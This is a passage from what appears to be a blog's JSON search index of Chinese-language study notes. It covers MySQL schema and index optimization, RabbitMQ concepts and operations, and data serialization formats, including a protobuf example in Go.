NULL。\n如果在时间上要超过Linux时间的，或者服务器时区不一样的就建议选择 datetime。\n如果是想要使用自动插入时间或者自动更新时间功能的，可以使用timestamp。\n如果只是想表示年、日期、时间的还可以使用 year、 date、 time，它们分别占据 1、3、3 字节，而datetime就是它们的集合。\n4.1.5 位数据类型 4.1.6 选择标识符 4.1.7 特殊类型数据 如果是IPv4类型，那么将IP转为INT UNSIGNED存储在数据库能节约内存，INET_ATON()和INET_NTOA()可以管理ip地址在字符串和数字值之间的转换。\nUUID的长度为36个字符，UNHEX()将UUID转换为16字节的数据,存储到BINARY(16) 种，比人类可读形式（“文本”形式）使用的VARCHAR（36）小的多.HEX()\nmysql数据表中的一个status字段 为tinyint类型，长度为1 ，comment为：0未审核 1 审核通过 -1 审核失败\u0026rsquo;,\n4.3 范式与反范式 关系型数据库设计：三大范式的通俗理解\n 第一范式：要求数据库表的每一列都是不可分割的原子数据项。 第二范式：（2NF）属性完全依赖于主键 第三范式：（3NF）属性不依赖于其它非主属性，在2NF基础上消除传递依赖 BCNF 在第三范式的基础上，数据库表中如果不存在任何字段对任一候选关键字段的传递函数依赖。  4.4 缓存表与汇总表 有时提升性能最好的方法是在同一张表中保存衍生的冗余数据。然而，有时也需要创建一张完全独立的汇总表或缓存表。\n缓存表和汇总表与冗余的列有异曲同工之妙，只不过实现在单独的表中。\n缓存表中存储与其它的表逻辑冗余的数据，将大表中活跃的数据单独拿出来构建成一张小表，通过减少单个表的数据量来提高查询性能，即所谓的热数据分离，尤其是在大表中的某些小部分数据被频繁访问时更能体现其带来的好处。\n汇总表中存储与其它的表逻辑不同的衍生数据，通过减少聚合次数来提高查询性能，同样，这些数据也经常被访问。\n但两者都必须面对数据的同步问题，对于允许最终一致性的场景来说，建立缓存表或者汇总表，无疑是一个好主意，但是如果需要实时更新，那就得多花一些心思来斟酌一二了。\n优缺点\n 缓存表用来存储那些每次获取速度比较慢（其他表中活跃）的数据的表 汇总表保存你的是使用groupby语句聚合数据的表  二者的目的都是显著提高查询性能，但也会增加写查询的负担，需要额外的维护任务。\n然而，写操作变慢并不是读操作变得更快所付出的唯一代价，还可能同时增加读操作和写操作的开发难度\n实际例子\n仍然以网站为例，假设需要计算之前24小时内发送的消息数。在一个很繁忙的网站不可能维护一个实时精确的计数器。作为替代方案，可以每小时生成一张汇总表。这样也许一条简单的查询就可以做到，并且比实时维护计数器要高效得多。缺点是计数器并不是100%精确。\n如果必须获得过去24小时准确的消息发送数量(没有遗漏)，有另外一种选择。 以每小时汇总表为基础，把前23个完整的小时的统计表中的计数全部加起来，最后再加上开始阶段和结束阶段不完整的小时内的计数。\n不严格的计数或通过小范围查询填满间隙的严格计数都比计算message表的所有行要有效得多。这是建立汇总表的最关键原因。实时计算统计值是很昂贵的操作，因为要么需要扫描表中的大部分数据，要么查询语句只能在某些特定的索引上才能有效运行，而这类特定索引-般会对 UPDATE操作有影响，所以一般不希望创建这样的索引。计算最活跃的用户或者最常见的“标签”是这种操作的典型例子。\n常见应用-计数器表\n 如果应用在表中保存计数器，则在更新计数器时可能遇到并发问题。 计数器表在Web应用中很常见。可以用这种表缓存一个用户的朋友数、文件下载次数等。 创建一张独立的表存储计数器通常是个好办法，这样可使计数器表小且快。使用独立的表可以帮助避免查询缓存失效  实际示例：\n假设有一个计数器表，只有一行数据，记录网站的点击次数\n网站的每次点击都会导致对计数器进行更新\n问题在于，对于任何想要更新这一行的事务来说，这条记录上都有一个全局的互斥锁（mutex）。这会使得这些事务只能串行执行。要获得更高的并发更新性能，也可以将计数器保存在多行中，每次随机选择一行进行更新。这样做需要对计数器表进行如下修改：\n然后预先在这张表增加100行数据。现在选择一个随机的槽（slot）进行更新：\n要获得统计结果，需要使用下面这样的聚合：\n一个常见的需求是每隔一段时间开始一个新的计数器（例如，每天一个）。如果需要这么做，则可以简单修改一下表设计：\n在这个场景中，可以不用像前面的例子那样预先生成行，而用ON DUPLICATE KEY UPDATE 代替：\n如果希望减少表的行数，以避免表变得太大，可以写一个周期执行的任务，合并所有结果到0号槽，并且删除其他所有的槽\n4.5 加快ALTER TABLE的速度 ALTER TABLE操作的性能对来说是个大问题。MySQL执行大部分修改表结构操作的方法是用新的结构创建一个空表，从旧表中查出所有数据插入新表，然后删除旧表。\n　一般而言，大部分ALTER TABLE操作将导致MySQL服务中断。对常见的场景，能使用的 技巧只有两种： 1.1. 一种是先在一台不提供服务的机器上执行ALTER TABLE操作，然后和提供服务的主库进行切换；\n1.2. 另外一种技巧是“影子拷贝”。影子拷贝的技术是用要求的表结构创建一张和源表无关的新表，然后通过重命名和删表操作交换两张表。\n只修改.frm文件 　修改表的.frm文件是很快的，但MySQL有时候会在没有必要的时候也重建表。如果愿意冒一些风险，可以让MySQL做一些其他类型的修改而不用重建表。\n我们下面要演示的技巧是不受官方支持的，也没有文档记录，并且也可能不能正常工作，采用这些技术需要自己承担风险。建议在执行之前 首先备份数据！\n下面这些操作是有可能不需要重建表的：\n移除(不是增加)一列的AUTO_INCREMENT属性。 增加、移除，或更改ENUM和SET常量。如果移除的是已经有行数据用到其值的常量，查询将会返回一个空字串值。\n　基本技术是为想要的表结构创建一个新的.frm文件，然后用它替换掉已经存在的那张表的.frm文件，像下面这样： 1. 创建一张有相同结构的空表，并进行所需要的修改（例如增加ENUM常量）。 2. 执行FLUSH TABLES WITH READ LOCK。这将会关闭所有正在使用的表，并且禁止任何表被打开。 3. 交换.frm文件（重全名）。 4. 执行UNLOCK TABLES来释放第2步的读锁。\nInnoDB快速载入数据 　在MyISAM中有一个常用的技巧是禁用索引（只能禁用非唯一索引）、载入数据，然后重新启用索引。在现代版本的InnoDB版本中，有一个类似的技巧，这依赖于InnoDB的快速在线索引创建功能。这个技巧是，先删除所有的非唯一索引，然后增加新的列，最后重新创建删除掉的索引。Percona Server可以自动完成这些操作步骤。 也可以使用像前面据说的ALTER TABLE的骇客访求来加速这个操作，但需要多做一些工作并且承担一定的风险。这对从备份中载入数据是很有用的，例如，当已经知道所有数据都是有效的并且没有必要做唯一性检查时就可以操作。\n下面是操作步骤：\n用需要的表结构创建一张表，但不包括索引。 载入数据到表中以构建.MYD文件。 按照需要的结构创建另外一张空表，这次要包含索引。这会创建需要的.frm和.MYI文件。 获取读锁并刷新表。 重命名第二张表的.frm和.MYI文件，让MySQL认为是第一张表文件。 释放读锁。 使用REPAIR TABLE来重建表的索引。该操作会通过排序来构建所有索引，包括唯一索引。 这个操作步骤对大表来说会快很多。\n总结 第五章 创建高性能的索引 5.1 索引基础 5.1.1索引的类型 索引位于存储引擎层，不同存储引擎中索引的工作方式也并不一样，也不是所有存储引擎都支持所有类型的索引。即使多个存储引擎支持同一种类型的索引，其底层的实现也可能不同。\nB-Tree 索引 B-Tree 索引的数据都是顺序存储的，所以很适合查询范围数据，以及对数据进行排序。\nInnoDB 底层使用的是 B+Tree 数据结构\n假设索引为key(last_name,first_name,dob) 索引列的顺序很重要\n对索引有效的查询类型：\n全值匹配 匹配最左前缀（组合索引） 匹配列前缀 匹配范围值 精确匹配某一列并范围匹配另外一列 只访问索引的查询\n对索引无效的查询：\n组合索引中，不按照索引的最左列开始查询，无法使用索引 组合索引中，不能跳过索引中的列 如果查询中包含某列的范围查询，则其右边所有列都无法使用索引优化查找\n哈希索引 哈希索引（Hash Index）是基于哈希表实现的，只有精确匹配索引所有列的查询才有效。\n存储引擎会为每一行数据的索引列计算出一个哈希码（Hash Code），并将哈希码存储在索引中，同时保存了指向该行的指针。 🌹 在 MySQL 中，只有 Memory 引擎显式地支持哈希索引，是该引擎的默认索引类型。\n 索引中的数据并不是按照索引值顺序存储的，无法用于排序 不支持部分索引匹配查询 只支持等值比较查询，包括：=、IN()、\u0026lt; = \u0026gt; 哈希冲突时，存储引擎会遍历链表中所有的行指针，逐行进行比较，直到找到所有符合条件的行；如果哈希冲突很多的话，一些索引维护操作的代码也会很高。  ps：也可以在B-Tree基础上创建一个伪哈希索引\nR-Tree 索引 R-Tree 索引也叫做空间索引，可以用于地理数据存储，目前 MyISAM 存储引擎支持该索引。\n空间索引会从所有维度来索引数据，查询时，可以有效地使用任意维度来组合查询。\n必须使用 MySQL 的 GIS 相关函数来维护数据。MySQL 的 GIS 支持并不完善，所以大部分人不会使用这个特性。\n全文索引 全文索引是一种特殊类型的索引，它查找的是文本中的关键词，而不是直接比较索引中的值。\n全文搜索和其他几类索引的匹配方式完全不一样，它更类似于搜索引擎。\n5.2 索引的优点 索引能大幅度提升查询性能，大部分索引时指的b-tree。\n1，索引事扫描全表变得扫描部分。\n2，索引使随机排序变成顺寻排序\n3，索引可以使服务器避免排序和临时表。\n当然对大多数小数据表，全表扫描时优于索引的，索引对于大型表的查询提升是有效的，但随之带来表插入速度的变慢等代价。\n对于某些业务可以使用分区技术来解决，例如日期是查询必不可少的条件。\n5.3 高性能的索引策略 5.4 索引案例学习 5.5 维护索引和表 总结 ","permalink":"https://kevinerr.github.io/posts/tech/%E9%AB%98%E6%80%A7%E8%83%BDmysql%E7%AC%94%E8%AE%B0/","summary":"第四章 Schema与数据类型优化 4.1 选择优化的数据类型 几个简单的原则 更小的通常更好 eg：能用varchar(1)就不用开varchar(10)","title":"高性能mysql笔记"},{"content":"如何设计一个注册中心？\n如何设计一个RPC框架？\n","permalink":"https://kevinerr.github.io/posts/tech/%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83/","summary":"如何设计一个注册中心？ 如何设计一个RPC框架？","title":"注册中心"},{"content":"什么是中间件 中间件（Middleware）是处于操作系统和应用程序之间的软件\n举例： 1，RMI（Remote Method Invocations, 远程调用） 2，Load Balancing(负载均衡，将访问负荷分散到各个服务器中) 3，Transparent Fail-over(透明的故障切换) 4，Clustering(集群,用多个小的服务器代替大型机） 5，Back-end-Integration(后端集成，用现有的、新开发的系统如何去集成遗留的系统) 6，Transaction事务（全局/局部）全局事务（分布式事务）局部事务（在同一数据库联接内的事务） 7，Dynamic Redeployment(动态重新部署,在不停止原系统的情况下，部署新的系统） 8，System Management(系统管理) 9，Threading(多线程处理) 10，Message-oriented Middleware面向消息的中间件（异步的调用编程） 11，Component Life Cycle(组件的生命周期管理) 12，Resource pooling（资源池） 13，Security（安全） 14，Caching（缓存）\n基于消息中间件的分布式系统的架构 从上图中可以看出来，消息中间件的是 1：利用可靠的消息传递机制进行系统和系统直接的通讯 2：通过提供消息传递和消息的排队机制，它可以在分布式系统环境下扩展进程间的通讯。\n消息中间件应用的场景 1:跨系统数据传递 2:高并发的流量削峰 3:数据的分发和异步处理 4:大数据分析与传递 5:分布式事务 比如你有一个数据要进行迁移或者请求并发过多的时候，比如你有10W的并发请求下订单，我们可以在这些订单入库之前，我们可以把订单请求堆积到消息队列中，让它稳健可靠的入库和执行。\n消息中间件的核心组成部分 1：消息的协议 2：消息的持久化机制 3：消息的分发策略 4：消息的高可用，高可靠 5：消息的容错机制\n消息队列协议 面试题：为什么消息中间件不直接使用http协议呢？ 1: 因为http请求报文头和响应报文头是比较复杂的，包含了cookie，数据的加密解密，状态码，响应码等附加的功能，但是对于一个消息而言，我们并不需要这么复杂，也没有这个必要性，它其实就是负责数据传递，存储，分发就行，一定要追求的是高性能。尽量简洁，快速。 2:大部分情况下http大部分都是短链接，在实际的交互过程中，一个请求到响应很有可能会中断，中断以后就不会就行持久化，就会造成请求的丢失。这样就不利于消息中间件的业务场景，因为消息中间件可能是一个长期的获取消息的过程，出现问题和故障要对数据或消息就行持久化等，目的是为了保证消息和数据的高可靠和稳健的运行。\nAMQP协议 AMQP：(全称：Advanced Message Queuing Protocol) 是高级消息队列协议。由摩根大通集团联合其他公司共同设计。是一个提供统一消息服务的应用层标准高级消息队列协议，是应用层协议的一个开放标准，为面向消息的中间件设计。基于此协议的客户端与消息中间件可传递消息，并不受客户端/中间件不同产品，不同的开发语言等条件的限制。Erlang中的实现有RabbitMQ等。 特性： 1：分布式事务支持。 2：消息的持久化支持。 3：高性能和高可靠的消息处理优势。\nAMQP协议的支持者：RabbitMQ、ACTIVEMQ\nMQTT协议 [RabbitMQ使用MQTT实现即时通讯\nMQTT协议：（Message Queueing Telemetry Transport）消息队列遥测传输协议\n是IBM开放的一个即时通讯协议，物联网系统架构中的重要组成部分。 特点： 1：轻量 2：结构简单 3：传输快，不支持事务 4：没有持久化设计。 应用场景： 1：适用于计算能力有限 2：低带宽 3：网络不稳定的场景。\nMQTT协议的支持者：RabbitMQ、ACTIVEMQ\nOpenMessage协议 是近几年由阿里、雅虎和滴滴出行、Stremalio等公司共同参与创立的分布式消息中间件、流处理等领域的应用开发标准。 特点： 1：结构简单 2：解析速度快 3：支持事务和持久化设计。\nOpenMessage协议的支持者：RocketMQ\nKafka协议 Kafka协议是基于TCP/IP的二进制协议。消息内部是通过长度来分割，由一些基本数据类型组成。 特点是： 1：结构简单 2：解析速度快 3：无事务支持 4：有持久化设计、\nKafka协议的支持者：Kafka\n消息队列持久化 简单来说就是将数据存入磁盘，而不是存在内存中随服务器重启断开而消失，使数据能够永久保存。\n把消息默认放在内存中是为了加快传输和消费的速度，存入磁盘是保证消息数据的持久化。\n非持久消息：是指当内存不够用的时候，会把消息和数据转移到磁盘，但是重启以后非持久化队列消息就丢失。\nRabbitMQ的持久化队列分为： 1：队列持久化 2：消息持久化 3：交换机持久化 不论是持久化的消息还是非持久化的消息都可以写入到磁盘中，只不过非持久的是等内存不足的情况下才会被写入到磁盘中。\n    ActiveMQ RabbitMQ Kafka RocketMQ     文件存储 支持 支持 支持 支持   数据库 支持 / / /    消息的分发策略 MQ消息队列有如下几个角色 1：生产者 2：存储消息 3：消费者 那么生产者生成消息以后，MQ进行存储，消费者是如何获取消息的呢？一般获取数据的方式无外乎推（push）或者拉（pull）两种方式，典型的git就有推拉机制，我们发送的http请求就是一种典型的拉取数据库数据返回的过程。而消息队列MQ是一种推送的过程，而这些推机制会适用到很多的业务场景也有很多对应推机制策略。\n    ActiveMQ RabbitMQ Kafka RocketMQ     发布订阅 支持 支持 支持 支持   轮询分发 支持 支持 支持 /   公平分发 / 支持 支持 /   重发 支持 支持 / 支持   消息拉取 / 支持 支持 支持    消息队列高可用和高可靠 高可用 所谓高可用：是指产品在规定的条件和规定的时刻或时间内处于可执行规定功能状态的能力。 当业务量增加时，请求也过大，一台消息中间件服务器的会触及硬件（CPU,内存，磁盘）的极限，一台消息服务器你已经无法满足业务的需求，所以消息中间件必须支持集群部署。来达到高可用的目的。\n集群模式1 - Master-slave主从共享数据的部署方式 生产者讲消息发送到Master节点，所有的client都连接这个消息队列共享这块数据区域，Master节点负责写入，一旦Master挂掉，slave节点继续服务。从而形成高可用\n集群模式2 - Master- slave主从同步部署方式 这种模式写入消息同样在Master主节点上，但是主节点会同步数据到slave节点形成副本，和zookeeper或者redis主从机制很类同。这样可以达到负载均衡的效果，如果消费者有多个这样就可以去不同的节点就行消费，以为消息的拷贝和同步会暂用很大的带宽和网络资源。在后续的rabbtmq中会有使用。\n集群模式3 - 多主集群同步部署模式 和上面的区别不是特别的大，但是它的写入可以往任意节点去写入。\n集群模式4 - 多主集群转发部署模式 解释：如果你插入的数据是broker-1中，元数据信息会存储数据的相关描述和记录存放的位置（队列）。 它会对描述信息也就是元数据信息就行同步，如果消费者在broker-2中进行消费，发现自己几点没有对应的消息，可以从对应的元数据信息中去查询，然后返回对应的消息信息，场景：比如买火车票或者黄牛买演唱会门票，比如第一个黄牛有顾客说要买的演唱会门票，但是没有但是他会去联系其他的黄牛询问，如果有就返回。\n集群模式5 Master-slave与Breoker-cluster组合的方案 解释：实现多主多从的热备机制来完成消息的高可用以及数据的热备机制，在生产规模达到一定的阶段的时候，这种使用的频率比较高。\n这么集群模式，具体在后续的课程中会进行一个分析和讲解。他们的最终目的都是为保证：消息服务器不会挂掉，出现了故障依然可以抱着消息服务继续使用。\n反正终归三句话： 1：要么消息共享， 2：要么消息同步 3：要么元数据共享\n高可靠 所谓高可靠：是指系统可以无故障低持续运行，比如一个系统突然崩溃，报错，异常等等并不影响线上业务的正常运行，出错的几率极低，就称之为：高可靠。 在高并发的业务场景中，如果不能保证系统的高可靠，那造成的隐患和损失是非常严重的。 如何保证中间件消息的可靠性呢？可以从两个方面考虑： 1：消息的传输：通过协议来保证系统间数据解析的正确性。 2：消息的存储可靠：通过持久化来保证消息的可靠性。\nRabbitMQ的核心组成部分 AMQP生产者流转过程 AMQP生产者流转过程 核心概念： Server：又称Broker ,接受客户端的连接，实现AMQP实体服务。 安装rabbitmq-server Connection：连接，应用程序与Broker的网络连接 TCP/IP/ 三次握手和四次挥手 Channel：网络信道，几乎所有的操作都在Channel中进行，Channel是进行消息读写的通道，客户端可以建立对各Channel，每个Channel代表一个会话任务。 Message :消息：服务与应用程序之间传送的数据，由Properties和body组成，Properties可是对消息进行修饰，比如消息的优先级，延迟等高级特性，Body则就是消息体的内容。 Virtual Host 虚拟地址，用于进行逻辑隔离，最上层的消息路由，一个虚拟主机理由可以有若干个Exhange和Queueu，同一个虚拟主机里面不能有相同名字的Exchange Exchange：交换机，接受消息，根据路由键发送消息到绑定的队列。(不具备消息存储的能力) Bindings：Exchange和Queue之间的虚拟连接，binding中可以保护多个routing key. Routing key：是一个路由规则，虚拟机可以用它来确定如何路由一个特定消息。 Queue：队列：也成为Message Queue,消息队列，保存消息并将它们转发给消费者。\nRabbitMQ的安装和使用 5种消息模式 http://www.macrozheng.com/#/reference/rabbitmq_start\n这5种消息模式是构建基于RabbitMQ的消息应用的基础，一定要牢牢掌握它们。\n简单模式 简单模式是最简单的消息模式，它包含一个生产者、一个消费者和一个队列。生产者向队列里发送消息，消费者从队列中获取消息并消费。\n模式示意图\n工作模式 工作模式是指向多个互相竞争的消费者发送消息的模式，它包含一个生产者、两个消费者和一个队列。两个消费者同时绑定到一个队列上去，当消费者获取消息处理耗时任务时，空闲的消费者从队列中获取并消费消息。\n模式示意图\n发布/订阅模式 发布/订阅模式是指同时向多个消费者发送消息的模式（类似广播的形式），它包含一个生产者、两个消费者、两个队列和一个交换机。两个消费者同时绑定到不同的队列上去，两个队列绑定到交换机上去，生产者通过发送消息到交换机，所有消费者接收并消费消息。\n路由模式 路由模式是可以根据路由键选择性给多个消费者发送消息的模式，它包含一个生产者、两个消费者、两个队列和一个交换机。两个消费者同时绑定到不同的队列上去，两个队列通过路由键绑定到交换机上去，生产者发送消息到交换机，交换机通过路由键转发到不同队列，队列绑定的消费者接收并消费消息。\n通配符模式 通配符模式是可以根据路由键匹配规则选择性给多个消费者发送消息的模式，它包含一个生产者、两个消费者、两个队列和一个交换机。两个消费者同时绑定到不同的队列上去，两个队列通过路由键匹配规则绑定到交换机上去，生产者发送消息到交换机，交换机通过路由键匹配规则转发到不同队列，队列绑定的消费者接收并消费消息。\n *：只能匹配一个单词； #：可以匹配零个或多个单词。  rabbitmq和spring同属一个公司开放的产品，所以他们的支持也是非常完善，这也是为什么推荐使用rabbitmq的一个原因。\n解耦、削峰、异步 同步异步的问题（串行） 串行方式：将订单信息写入数据库成功后，发送注册邮件，再发送注册短信。以上三个任务全部完成后，返回给客户端\n并行方式 异步线程池 并行方式：将订单信息写入数据库成功后，发送注册邮件的同时，发送注册短信。以上三个任务完成后，返回给客户端。与串行的差别是，并行的方式可以提高处理的时间\n存在问题： 1：耦合度高 2：需要自己写线程池自己维护成本太高 3：出现了消息可能会丢失，需要你自己做消息补偿 4：如何保证消息的可靠性你自己写 5：如果服务器承载不了，你需要自己去写高可用\n异步消息队列的方式 好处 1：完全解耦，用MQ建立桥接 2：有独立的线程池和运行模型 3：出现了消息可能会丢失，MQ有持久化功能 4：如何保证消息的可靠性，死信队列和消息转移的等 5：如果服务器承载不了，你需要自己去写高可用，HA镜像模型高可用。 按照以上约定，用户的响应时间相当于是订单信息写入数据库的时间，也就是50毫秒。注册邮件，发送短信写入消息队列后，直接返回，因此写入消息队列的速度很快，基本可以忽略，因此用户的响应时间可能是50毫秒。因此架构改变后，系统的吞吐量提高到每秒20 QPS。比串行提高了3倍，比并行提高了两倍\n流量的削峰 04、分布式事务的可靠消费和可靠生产 05、索引、缓存、静态化处理的数据同步 06、流量监控 07、日志监控（ELK） 08、下单、订单分发、抢票\nRabbitMQ高级-过期时间TTL 1、概述 过期时间TTL表示可以对消息设置预期的时间，在这个时间内都可以被消费者接收获取；过了之后消息将自动被删除。RabbitMQ可以对消息和队列设置TTL。目前有两种方法可以设置。\n 第一种方法是通过队列属性设置，队列中所有消息都有相同的过期时间。 第二种方法是对消息进行单独设置，每条消息TTL可以不同。  如果上述两种方法同时使用，则消息的过期时间以两者之间TTL较小的那个数值为准。消息在队列的生存时间一旦超过设置的TTL值，就称为dead message被投递到死信队列， 消费者将无法再收到该消息。\nRabbitMQ高级-消息确认机制的配置 NONE值是禁用发布确认模式，是默认值 CORRELATED值是发布消息成功到交换器后会触发回调方法，如1示例 SIMPLE值经测试有两种效果，其一效果和CORRELATED值一样会触发回调方法，其二在发布消息成功后使用rabbitTemplate调用waitForConfirms或waitForConfirmsOrDie方法等待broker节点返回发送结果，根据返回结果来判定下一步的逻辑，要注意的点是waitForConfirmsOrDie方法如果返回false则会关闭channel，则接下来无法发送消息到broker;\nRabbitMQ高级-死信队列 DLX，全称为Dead-Letter-Exchange , 可以称之为死信交换机，也有人称之为死信邮箱。当消息在一个队列中变成死信(dead message)之后，它能被重新发送到另一个交换机中，这个交换机就是DLX ，绑定DLX的队列就称之为死信队列。 消息变成死信，可能是由于以下的原因：\n 消息被拒绝 消息过期 队列达到最大长度  DLX也是一个正常的交换机，和一般的交换机没有区别，它能在任何的队列上被指定，实际上就是设置某一个队列的属性。当这个队列中存在死信时，Rabbitmq就会自动地将这个消息重新发布到设置的DLX上去，进而被路由到另一个队列，即死信队列。 要想使用死信队列，只需要在定义队列的时候设置队列参数 x-dead-letter-exchange 指定交换机即可。\n流程\nRabbitMQ运维-内存磁盘的监控 当内存使用超过配置的阈值或者磁盘空间剩余空间对于配置的阈值时，RabbitMQ会暂时阻塞客户端的连接，并且停止接收从客户端发来的消息，以此避免服务器的崩溃，客户端与服务端的心态检测机制也会失效。 如下图：\n当出现blocking或blocked话说明到达了阈值和以及高负荷运行了。\nRabbitMQ的内存换页 在某个Broker节点及内存阻塞生产者之前，它会尝试将队列中的消息换页到磁盘以释放内存空间，持久化和非持久化的消息都会写入磁盘中，其中持久化的消息本身就在磁盘中有一个副本，所以在转移的过程中持久化的消息会先从内存中清除掉。\n 默认情况下，内存到达的阈值是50%时就会换页处理。 也就是说，在默认情况下该内存的阈值是0.4的情况下，当内存超过0.4*0.5=0.2时，会进行换页动作。\n 比如有1000MB内存，当内存的使用率达到了400MB,已经达到了极限，但是因为配置的换页内存0.5，这个时候会在达到极限400mb之前，会把内存中的200MB进行转移到磁盘中。从而达到稳健的运行。\n可以通过设置 vm_memory_high_watermark_paging_ratio 来进行调整\nRabbitMQ的磁盘预警 当磁盘的剩余空间低于确定的阈值时，RabbitMQ同样会阻塞生产者，这样可以避免因非持久化的消息持续换页而耗尽磁盘空间导致服务器崩溃。\n 默认情况下：磁盘预警为50MB的时候会进行预警。表示当前磁盘空间第50MB的时候会阻塞生产者并且停止内存消息换页到磁盘的过程。 这个阈值可以减小，但是不能完全的消除因磁盘耗尽而导致崩溃的可能性。比如在两次磁盘空间的检查空隙内，第一次检查是：60MB ，第二检查可能就是1MB,就会出现警告。\n ","permalink":"https://kevinerr.github.io/posts/tech/rabbitmq/","summary":"什么是中间件 中间件（Middleware）是处于操作系统和应用程序之间的软件 举例： 1，RMI（Remote Method Invocations, 远程调用） 2，Load Bala","title":"RabbitMQ"},{"content":"序列化与反序列化 将不同语言的特有数据结构搞成大家都认的二进制串\n将大家都认的二进制串子搞成不同语言的特有数据结构\n如果在一大坨微服务构成的庞大业务系统中，各个业务系统之间飞数据的序列化反序列化部分需要技术选型时候，参考标准是什么？\n 性能？序列化和反序列化的速度越快越好，序列化后的数据占用空间越小越好 可读性？可读性最好的应该是json咯？这里主要说的是序列化完毕后你肉眼看到的是一坨什么玩意，如果一眼就能看到序列化后那坨玩意是啥样想必会好很多 扩展兼容？如果业务频繁改动，添加新字段还要兼容原来业务，对扩展性和兼容性就应该有讲究了 健壮性和通用性？主要是通用性吧，要知道如果这个序列化反序列化方案属于某个平台语言专有，那还是很难受的。一个成熟完整的方案一定能够兼顾众多语言众多特性，比如说thrift吧假如TA不支持Java的map或者对php的array支持不好，就有点儿扯了  json JSON: JavaScript Object Notation(JavaScript 对象表示法)\njson: 一般的web项目中，最流行的主要还是 json。因为浏览器对于json 数据支持非常好，有很多内建的函数支持。\n1 2 3 4 5 6 7  {  \u0026#34;sites\u0026#34;: [  { \u0026#34;name\u0026#34;:\u0026#34;菜鸟教程\u0026#34; , \u0026#34;url\u0026#34;:\u0026#34;www.runoob.com\u0026#34; },  { \u0026#34;name\u0026#34;:\u0026#34;google\u0026#34; , \u0026#34;url\u0026#34;:\u0026#34;www.google.com\u0026#34; },  { \u0026#34;name\u0026#34;:\u0026#34;微博\u0026#34; , \u0026#34;url\u0026#34;:\u0026#34;www.weibo.com\u0026#34; }  ] }   json格式化工具\nXML 可扩展标记语言（EXtensible Markup Language）\nxml: 在 webservice 中应用最为广泛，但是相比于 json，它的数据更加冗余，因为需要成对的闭合标签。json 使用了键值对的方式，不仅压缩了一定的数据空间，同时也具有可读性。\n下面实例是 Jani 写给 Tove 的便签，存储为 XML：\n1 2 3 4 5 6 7  \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;note\u0026gt; \u0026lt;to\u0026gt;Tove\u0026lt;/to\u0026gt; \u0026lt;from\u0026gt;Jani\u0026lt;/from\u0026gt; \u0026lt;heading\u0026gt;Reminder\u0026lt;/heading\u0026gt; \u0026lt;body\u0026gt;Don\u0026#39;t forget me this weekend!\u0026lt;/body\u0026gt; \u0026lt;/note\u0026gt;   msgpack It’s like JSON. but fast and small. 简单来讲，它的数据格式与json类似，但是在存储时对数字、多字节字符、数组等都做了很多优化，减少了无用的字符，二进制格式，也保证不用字符化带来额外的存储空间的增加。以下是官网给出的简单示例图：\nprotobuf Google Protocol Buffer(简称 Protobuf)是google旗下的一款轻便高效的结构化数据存储格式，平台无关、语言无关、可扩展，可用于通讯协议和数据存储等领域。所以很适合用做数据存储和作为不同应用，不同语言之间相互通信的数据交换格式，只要实现相同的协议格式即同一 proto文件被编译成不同的语言版本，加入到各自的工程中去。这样不同语言就可以解析其他语言通过 protobuf序列化的数据。目前官网提供了 C++,Python,JAVA,GO等语言的支持。google在2008年7月7号将其作为开源项目对外公布。\ntips：\n 啥叫平台无关？Linux、mac和Windows都可以用，32位系统，64位系统通吃 啥叫语言无关？C++、Java、Python、Golang语言编写的程序都可以用，而且可以相互通信 那啥叫可扩展呢？就是这个数据格式可以方便的增删一部分字段啦~ 最后，啥叫序列化啊？解释得通俗点儿就是把复杂的结构体数据按照一定的规则编码成一个字节切片  使用 1、下载protoc、protoc-gen-go\n教程\n2、编写proto文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  syntax = \u0026#34;proto3\u0026#34;; //指定版本信息，不指定会报错 option go_package=\u0026#34;./;pb\u0026#34;;package pb;\t//后期生成go文件的包名 //message为关键字，作用为定义一种消息类型 message Person {\tstring\tname = 1;\t//姓名  int32\tage = 2;\t//年龄 \trepeated string emails = 3; //电子邮件（repeated表示字段允许重复） \trepeated PhoneNumber phones = 4;\t//手机号 }//enum为关键字，作用为定义一种枚举类型 enum PhoneType { MOBILE = 0; HOME = 1; WORK = 2;}//message为关键字，作用为定义一种消息类型可以被另外的消息类型嵌套使用 message PhoneNumber { string number = 1; PhoneType type = 2;}  3、编译\n1  protoc --proto_path=IMPORT_PATH --go_out=DST_DIR path/to/file.proto   其中：\n \u0026ndash;proto_path，指定了 .proto 文件导包时的路径，可以有多个，如果忽略则默认当前目录。 \u0026ndash;go_out， 指定了生成的go语言代码文件放入的文件夹 允许使用protoc --go_out=./ *.proto的方式一次性编译多个 .proto 文件 编译时，protobuf 编译器会把 .proto 文件编译成 .pd.go 文件  解决方案\n4、编译完成后你就可以使用这个.pd.go 文件了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  package main  import (  \u0026#34;fmt\u0026#34;  \u0026#34;github.com/golang/protobuf/proto\u0026#34;  \u0026#34;zinx/mydemo/protobufDemo/pb\u0026#34; //zinx是go mod包管理 )  func main() {  person := \u0026amp;pb.Person{  Name: \u0026#34;Aceld\u0026#34;,  Age: 16,  Emails: []string{\u0026#34;https://legacy.gitbook.com/@aceld\u0026#34;, \u0026#34;https://github.com/aceld\u0026#34;},  Phones: []*pb.PhoneNumber{  \u0026amp;pb.PhoneNumber{  Number: \u0026#34;13113111311\u0026#34;,  Type: pb.PhoneType_MOBILE,  },  \u0026amp;pb.PhoneNumber{  Number: \u0026#34;14141444144\u0026#34;,  Type: pb.PhoneType_HOME,  },  \u0026amp;pb.PhoneNumber{  Number: \u0026#34;19191919191\u0026#34;,  Type: pb.PhoneType_WORK,  },  },  }   data, err := proto.Marshal(person)  if err != nil {  fmt.Println(\u0026#34;marshal err:\u0026#34;, err)  }   newdata := \u0026amp;pb.Person{}  err = proto.Unmarshal(data, newdata)  if err != nil {  fmt.Println(\u0026#34;unmarshal err:\u0026#34;, err)  }  fmt.Println(person)  fmt.Println(data)  fmt.Println(newdata)  }   mydemo/ ├── protobufDemo ├── pb ├── person.proto ├── person.pb.go ├── main.go\nthrift Apache 